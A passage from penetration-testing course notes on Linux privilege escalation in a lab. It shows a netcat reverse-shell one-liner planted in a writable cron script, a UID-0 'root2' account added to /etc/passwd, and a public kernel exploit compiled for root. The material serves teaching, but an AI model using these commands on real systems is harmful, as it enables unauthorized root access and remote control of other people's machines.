• Judging by the timestamps, it seems that this job runs once every five minutes.
 
• Since we know the location of the script, we can inspect its contents and permissions

• The script itself is fairly straight-forward: it simply copies the student user’s home directory to the backups subdirectory.

• The permissions of the script reveal that every local user can write to the file.

currentuser  group  other-users      -rwx  rwx  rw- 


• Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner.

• If our plan works, we should receive a root-level reverse shell on our attacking machine after, at most, a five minute period.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/184.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/185.jpg)

student@debian:/var/scripts$ echo >> user_backup.sh
student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
student@debian:/var/scripts$ cat user_backups.sh
#!/bin/bash
cp -rf /home/student/ /var/backups/student/

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/186.jpg)

• All we have to do now is set up a listener on our Kali Linux machine and wait for the cron job toexecute:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/187.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/188.jpg)

kali@kali:~$ nc -lnvp 1234
 listening on [any] 1234 ...
 connect to [10.11.0.4] from (UNKNOWN) [10.11.0.128] 43172
 /bin/sh: 0: can't access tty; job control turned off
 # whoami
 root
 # 

• As shown in the previous listing, the cron job did execute, as did the reverse shell one-liner. 
 
• We have successfully elevated our privileges and have access to a root shell on the target.
 
• Although this was a simple example, we have encountered several similar situations in the field since administrators are often more focused on wrang ling cron’s odd syntax than on securing script file permissions.



18.3.2.1 Exercise1. Log in to your Debian client as an unprivileged user and attempt to elevate your privileges toroot using the above technique
18.3.3 Insecure File Permissions: /etc/passwd Case Study

18.3.3 Insecure File Permissions: /etc/passwd Case Study


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/189.jpg)


• Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow, which is not readable by normal users.

• Historically however,password hashes, along with other account information, were stored in the world-readable file /etc/passwd.

•  For backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available. 

• This means that if we can write into the /etc/passwd file, we can effectively set an arbitrary password for any account.

• Let’s demonstrate this. In a previous section we showed that our Debian client may be vulnerableto privilege escalation due to the fact that the /etc/passwd permissions were not set correctly. 

• Inorder to escalate our privileges, we are going to add another superuser (root2) and the corresponding password hash to the /etc/passwd file.

• We will first generate the password hashwith the help of openssl and the passwd argument. 
 
• By default, if no other option is specified , openssl will generate a hash using the crypt algorithm , which is a supported hashing mechanism for Linux authentication.
 
•  Once we have the generated hash, we will add a line to /etc/passwd using the appropriate format:


student@debian:~$ openssl passwd evil
AK24fcSx2Il3I
student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
student@debian:~$ su root2
Password: evil
root@debian:/home/student# id
uid=0(root) gid=0(root) groups=0(root)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/190.jpg)

• shown in Listing , the “root2” user and the password hash in our /etc/passwd record were followed by the user id (UID) zero and the group id (GID) zero.
 
• These zero values specify that theaccount we created is a superuser account on Linux.

• Finally, in order to verify that our modifications were valid, we used the su command to switch our standard user to the newly created root2 account and issued the id command to show that we indeed had root privileges.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/191.jpg)
18.3.3.1 Exercise


1. Log in to your Debian client with your student credentials and attempt to elevate yourprivileges by adding a superuser account to the /etc/passwd file
18.3.4 Kernel Vulnerabilities: CVE-2017-1000112 Case Study

18.3.4 Kernel Vulnerabilities: CVE-2017-1000112 Case Study

• Kernel exploits are an excellent way to escalate privileges, but success may depend on matching not only the target’s kernel version but also the operating system flavor, including Debian, Redhat,Gentoo, etc.

• Similar to our Windows examples, this section of the module will not be reproducible on your dedicated client, but you will be able to use this technique on various hosts inside the lab environment.

• To demonstrate this attack vector, we will first gather information about our target by inspectingthe /etc/issue file. As discussed earlier in the module, this is a system text file that contains amessage or system identification to be printed before the login prompt on Linux machines.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/192.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/193.jpg)

n00b@victim:~$ cat /etc/issue
Ubuntu 16.04.3 LTS \n \l


• Next, we will inspect the kernel version and system architecture using standard system commands:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/194.jpg)

n00b@victim:~$ uname -r
4.8.0-58-generic
n00b@victim:~$ arch
x86_64

• Our target system appears to be running Ubuntu 16.04.3 LTS (kernel 4.8.0-58-generic) on thex86_64 architecture. 

• Armed with this information, we can use searchsploit on our local Kalisystem to find kernel exploits matching the target version.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/195.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/196.jpg)

kali@kali:~$ searchsploit linux kernel ubuntu 16.04
-------------------------------------------------------- -----------------------------
Exploit Title | Path (/usr/share/exploitdb/
-------------------------------------------------------- -----------------------------
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04 | exploits/linux_x86-64/local/
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.0 | exploits/linux_x86/local/422
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow | exploits/linux/dos/39773.txt
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege | exploits/linux/local/40759.r
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | exploits/linux_x86-64/local/
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux_x86-64/local/
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' b | exploits/linux/local/39772.t
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | exploits/linux/local/40489.t
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.0 | exploits/linux/local/43418.c
---------------------------------------------------------- ---------------------------


• The last exploit (exploits/linux/local/43418.c) seems to directly correspond to the kernel versionthat our target is running. 

• We will attempt to elevate our privileges by running this exploit on the target



18.3.4.1 Compiling C/C++ Code on Linux

• We’ll use gcc on Linux to compile our exploit. 
 
• Keep in mind that when compiling code, we must match the architecture of our target.
 
• This is especially important in situations where the target machine does not have a compiler and we are forced to compile the exploit on our attacking machine or a sandboxed environment that replicates the target OS and architecture.

• In this example, we are fortunate that the target machine has a working compiler, but this is rare in the field.

• Let’s copy the exploit file to the target and compile it, passing only the source code file and -o tospecify the output filename (exploit):


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/197.jpg)

• SCP (secure copy) is a command-line utility that allows you to securely copy files and directories between two locations. With scp , you can copy a file or directory: From your local system to a remote system


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/198.jpg)

n00b@victim:~$ gcc 43418.c -o exploit
n00b@victim:~$ ls -lah exploit
total 36K
-rwxr-xr-x 1 kali kali 28K Jan 27 04:04 exploit


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/199.jpg)

• After compiling the exploit on our target machine, we can run it and use whoami to check ourprivilege level:

• Figure shows that our privileges were successfully elevated from n00b (standard user) to root,the highest privilege account on Linux operating systems.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/200.jpg)